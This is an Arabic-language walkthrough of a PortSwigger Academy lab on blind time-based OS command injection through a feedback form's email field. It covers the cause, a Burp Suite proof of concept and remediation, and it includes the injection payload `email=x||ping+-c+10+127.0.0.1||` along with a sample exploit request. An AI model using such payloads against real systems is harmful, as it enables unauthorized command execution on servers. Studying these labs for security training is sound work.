# Lab 02 — Blind OS Command Injection with Time Delays (حقن أعمى بالتأخير الزمني)

[![التصنيف](https://img.shields.io/badge/الفئة-OS%20Command%20Injection-red)]()
[![النوع](https://img.shields.io/badge/النوع-OS%20Command%20Injection%20(Blind%20Time-based)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/os-command-injection)

> هذا الشرح جزء من سلسلة [معامل حقن أوامر النظام (OS Command Injection)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 02 — Blind OS Command Injection with Time Delays (حقن أعمى بالتأخير الزمني) |
| **تصنيف الثغرة** | OS Command Injection (Blind Time-based) |
| **معيار الضعف (CWE)** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | إثبات وجود حقن أوامر أعمى في نموذج الفيدباك بتعطيل استجابة السيرفر لمدة 10 ثوانٍ. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يحتوي الموقع على صفحة إرسال آراء العملاء (Feedback Form) فيها حقول: الاسم، الإيميل، الموضوع، والرسالة. عندما يرسل العميل رأيه، يقوم السيرفر بتشغيل برنامج خادمي لإرسال إيميل إلى الإدارة بصيغة:
`mail -s "Subject" email@domain.com`.

**الخلل الفكري هنا:** لا تظهر أي نتائج للأمر في الشاشة؛ السيرفر دائماً يرد بصفحة ثابتة: `Thank you for submitting feedback`.
لكن حقل البريد الإلكتروني (`email`) يتم دمجه دون تنظيف داخل أمر الإيميل! ولأن المخرجات عمياء ولا نراها، نلجأ إلى تقنية **Time Delay**: نرسل أمر يطلب من نظام التشغيل إرسال 10 حزم ping محلية (`ping -c 10 127.0.0.1`). إذا كان السيرفر مصاباً، سيعلق الطلب ويتأخر الرد 10 ثوانٍ كاملة قبل أن يرجع للمتصفح، وهذا دليل قاطع لا يقبل الشك على تنفيذ الأمر!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يحقن أمر `ping` مع فاصل `||` في حقل الإيميل ويقيس زمن استجابة السيرفر للتأكد من وجود الثغرة في بيئة صامتة لا تعيد مخرجات.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور دمج حقل الإيميل داخل أمر تشغيل الإيميل في الشل بدلاً من استخدام مكتبة SMTP برمجية متخصصة.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. افتح صفحة **Submit feedback** واملأ النموذج بأي بيانات تجريبية واضغط Submit.
2. التقط طلب `POST /feedback/submit` في Burp Suite وأرسله إلى **Repeater**.
3. في جسم الطلب، استبدل حقل الإيميل بالبيلود التالي الذي يستدعي ping لمدة 10 ثوانٍ محاطاً بفاصل `||`:
`email=x||ping+-c+10+127.0.0.1||`.
4. اضغط Send وراقب عداد الوقت في الركن السفلي الأيمن من Burp Repeater.
5. ستلاحظ أن الطلب أخذ أكثر من 10,000 ملي ثانية (10 ثوانٍ) قبل أن يرد السيرفر بـ `200 OK`، وبذلك يحل اللاب!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /feedback/submit HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=...&name=test&email=x||ping+-c+10+127.0.0.1||
&subject=test&message=test
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK
(Returned after 10.2 seconds)

{"message": "Thank you for submitting feedback"}
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تنفيذ أوامر خفية في الخلفية يمكن تصعيدها لفتح اتصال عكسي (Reverse Shell) والسيطرة على السيرفر.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

استخدام مكتبات إرسال البريد الإلكتروني الآمنة المدمجة باللغة (مثل `PHPMailer` أو `smtplib` في بايثون) بدلاً من استدعاء أوامر النظام.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
